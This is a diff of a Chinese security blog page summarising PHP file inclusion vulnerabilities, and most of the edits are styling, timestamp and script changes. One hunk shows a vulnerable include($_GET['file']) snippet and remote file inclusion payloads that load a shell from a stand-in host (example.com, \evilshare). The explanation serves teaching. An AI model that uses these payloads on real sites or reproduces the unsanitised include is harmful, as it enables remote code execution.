@@ -128,7 +128,7 @@
 <meta property="og:site_name" content="技术分享博客">
 <meta property="og:description" content="PHP 文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-08-15T13:15:00.372Z">
+<meta property="og:updated_time" content="2017-08-17T09:22:59.816Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="PHP 文件包含漏洞总结">
 <meta name="twitter:description" content="PHP 文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入">
@@ -192,6 +192,62 @@
 
 
   <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-dark.min.css">
+  <style>
+    pre {
+      position: relative;
+    }
+
+    code.has-numbering {
+      margin-left: 2.5rem;
+    }
+
+    code.has-numbering::-webkit-scrollbar {
+      display: none;
+    }
+
+    .pre-numbering {
+      margin: 0;
+      position: absolute;
+      top: 0;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      height: 100%;
+    }
+
+    .pre-numbering li {
+      list-style-type: decimal-leading-zero !important;
+    }
+
+    blockquote {
+      color: #888;
+      background-color: #eae6f3;
+      border-left: 1rem solid #5236a0;
+      padding: 0 1.5rem;
+      position: relative;
+      font-family: 'Roboto', sans-serif;
+    }
+
+    blockquote:before,
+    blockquote:after {
+      color: #392570;
+      font-size: 2.5rem;
+      position: absolute;
+      line-height: 2.5rem;
+    }
+
+    blockquote:before {
+      content: "\201C";
+      left: -1rem;
+      top: 0;
+    }
+
+    blockquote:after {
+      content: "\201D";
+      right: 0;
+      bottom: -1rem;
+    }
+  </style>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -401,8 +457,8 @@
               
                 <span class="post-meta-item-text">更新于</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2017-08-15T21:15:00+08:00">
-                2017-08-15
+              <time title="更新于" itemprop="dateModified" datetime="2017-08-17T17:22:59+08:00">
+                2017-08-17
               </time>
             
           </span>
@@ -454,8 +510,6 @@
           
             <div class="post-wordcount">
               
-                
-                  <span class="post-meta-divider">|</span>
                 
                 <span class="post-meta-item-icon">
                   <i class="fa fa-file-word-o"></i>
@@ -595,7 +649,7 @@
 <h1 id="有限制的远程文件包含"><a href="#有限制的远程文件包含" class="headerlink" title="有限制的远程文件包含"></a>有限制的远程文件包含</h1><pre><code class="php">&lt;?php include($_GET[&#39;file&#39;] . &quot;.htm&quot;); ?&gt;
 </code></pre>
 <blockquote>
-<p>?file=<a href="http://example.com/shell" target="_blank" rel="external">http://example.com/shell</a> ?file=<a href="http://example.com/shell.txt?" target="_blank" rel="external">http://example.com/shell.txt?</a> ?file=<a href="http://example.com/shell.txt%23" target="_blank" rel="external">http://example.com/shell.txt%23</a><br><br>(需要allow_url_fopen=On并且allow_url_include=On)<br><br>?file=\evilshare\shell.php (只需要allow_url_include=On)</p>
+<p>?file=<a href="http://example.com/shell" target="_blank" rel="external">http://example.com/shell</a><br><br>?file=<a href="http://example.com/shell.txt?" target="_blank" rel="external">http://example.com/shell.txt?</a><br><br>?file=<a href="http://example.com/shell.txt%23" target="_blank" rel="external">http://example.com/shell.txt%23</a><br><br>(需要allow_url_fopen=On并且allow_url_include=On)<br><br>?file=\evilshare\shell.php (只需要allow_url_include=On)</p>
 </blockquote>
 <h1 id="延伸"><a href="#延伸" class="headerlink" title="延伸"></a>延伸</h1><p>其实在前面也说了，这些漏洞产生原因是PHP函数在引入文件时，传入的文件名没有经过合理的校验，从而操作了预想之外的文件。实际上我们操作文件的函数不只是include()一个，上面提到的一些截断的方法同样可以适用于以下函数：</p>
 <ul>
@@ -753,7 +807,7 @@
           
 
  
-  <div class="comments" id="comments">
+  <div id="comments">
     
   </div>
 
@@ -1536,8 +1590,17 @@
   <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
   <script type="text/javascript">
     $(function() {
-      $('pre code').each(function(i, block) {
-        hljs.highlightBlock(block)
+      hljs.initHighlighting();
+      $('pre code').each(function() {
+        var lines = $(this).text().split('\n').length - 1;
+        var $numbering = $('<ul/>').addClass('pre-numbering');
+        $(this)
+          .addClass('has-numbering')
+          .parent()
+          .append($numbering);
+        for (i = 1; i <= lines; i++) {
+          $numbering.append($('<li/>'));
+        }
       });
     });
   </script>
